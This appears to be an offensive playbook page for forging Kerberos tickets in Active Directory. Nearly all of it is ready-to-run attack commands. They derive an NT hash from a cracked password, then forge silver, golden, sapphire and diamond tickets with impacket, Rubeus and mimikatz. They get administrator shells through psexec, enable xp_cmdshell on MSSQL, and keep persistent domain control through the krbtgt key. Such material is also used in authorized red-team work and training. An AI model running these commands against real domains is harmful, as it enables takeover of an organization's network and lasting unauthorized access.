# Forging Kerberos tickets

## Before I start
sudo ntpdate <DCIP>
- [ ] KRB_AP_ERR_SKEW on any line below: the clock again, right before it
- [ ] Silver needs one service account's NT hash and never touches the DC; golden, diamond and sapphire need the krbtgt key, which means I already own the domain
- [ ] Each needs the domain SID: :Pb domain-enum, or the line below
At the pwn-broker prompt: tool install impacket.
impacket-lookupsid '<Domain>/<Username>:<Password>@<DCIP>'
- [ ] Domain SID is S-1-5-21-...: that is <DomainSID>, without a trailing -<RID>

## The service account's NT hash, for a silver ticket
Cracking a service account with :Pb kerberoasting gives the plaintext, not the hash. Silver wants the NT hash:
python3 -c 'import hashlib;print(hashlib.new("md4","THE-CRACKED-PASSWORD".encode("utf-16le")).hexdigest())'
- [ ] This is the account that runs the service: its hash signs the ticket
- [ ] A computer account's hash works too, for a silver ticket to that host's own services

## Silver ticket: one service, no DC
Forge a ticket to one SPN as administrator, signed by the service account's hash. The DC never sees it.
impacket-ticketer -nthash THE-SERVICE-HASH -domain-sid <DomainSID> -domain <Domain> -spn cifs/<Hostname>.<Domain> administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass '<Domain>/administrator@<Hostname>.<Domain>'
- [ ] administrator need not exist: the service trusts the PAC in the ticket, which forges Domain Admins, and never asks the DC
- [ ] The SPN is the service I forge for: cifs for psexec and smbexec, http for WinRM, host for a scheduled task
- [ ] -k wants the host's FQDN, never its IP

## Silver ticket to MSSQL
impacket-ticketer -nthash THE-SERVICE-HASH -domain-sid <DomainSID> -domain <Domain> -spn mssqlsvc/<Hostname>.<Domain>:1433 administrator
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k -no-pass '<Domain>/administrator@<Hostname>.<Domain>'
- [ ] enable_xp_cmdshell, then xp_cmdshell whoami: :Pb mssql for the rest

## Golden ticket: the whole domain, once I have the krbtgt hash
The krbtgt hash comes from a DCSync or the NTDS.dit, so this is persistence over a domain I already took: it outlives a reset of any one account.
impacket-ticketer -nthash THE-KRBTGT-HASH -domain-sid <DomainSID> -domain <Domain> administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass '<Domain>/administrator@<DCHost>'
- [ ] This administrator ticket is a TGT for anyone: swap the name, it still signs
- [ ] The domain can rotate krbtgt and kill the ticket: take a fresh hash while I still have DCSync, :Pb acl-abuse

## Sapphire: a golden ticket that looks real
With the krbtgt AES key as well as its hash, forge from a TGT the DC really issued and splice in administrator's own PAC over S4U2Self, so the groups are real and the ticket is far harder to spot than a golden one. Still the krbtgt key, so still after a DCSync.
impacket-ticketer -request -impersonate administrator -user '<Username>' -password '<Password>' -aesKey THE-KRBTGT-AES -nthash THE-KRBTGT-HASH -domain <Domain> -domain-sid <DomainSID> -dc-ip <DCIP> administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass '<Domain>/administrator@<DCHost>'
- [ ] secretsdump from the DCSync prints both: the krbtgt NT hash and its aes256_hmac key, THE-KRBTGT-AES
- [ ] -impersonate pulls the real PAC, so I name no groups myself: :Pb acl-abuse for the DCSync

## From a Windows shell
At the pwn-broker prompt:
tool install rubeus
serve
serve files rubeus
On the Windows host:
- [ ] Rubeus.exe fetched with the line serve files gives
/ptt drops the ticket straight into my session.
.\Rubeus.exe silver /service:cifs/<Hostname>.<Domain> /rc4:THE-SERVICE-HASH /user:administrator /domain:<Domain> /sid:<DomainSID> /ptt
.\Rubeus.exe golden /rc4:THE-KRBTGT-HASH /user:administrator /domain:<Domain> /sid:<DomainSID> /ptt
A diamond ticket, the Windows match for sapphire: edit a real TGT with the krbtgt AES key.
.\Rubeus.exe diamond /krbkey:THE-KRBTGT-AES /user:<Username> /password:<Password> /enctype:aes /domain:<Domain> /dc:<DCHost> /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
- [ ] mimikatz, from https://github.com/gentilkiwi/mimikatz/releases, does golden the same way: kerberos::golden /user:administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:THE-KRBTGT-HASH /ptt
- [ ] mimikatz does silver as that golden command with /target:<Hostname>.<Domain> /service:cifs /rc4:THE-SERVICE-HASH
- [ ] /krbkey is the krbtgt AES key, not the NT hash; /ticketuserid:500 and /groups:512 make the ticket administrator in Domain Admins
- [ ] Loaded with /ptt: dir \\<Hostname>.<Domain>\c$ to prove it, then :Pb lateral-movement for the exec

## Clean up and next
- [ ] The .ccache files removed and the variable cleared: unset KRB5CCNAME
- [ ] Every hash from a DCSync kept and tried across the domain: :Pb lateral-movement
- [ ] A silver ticket was enough for the one host; for the domain it is the krbtgt key or a DCSync: :Pb acl-abuse
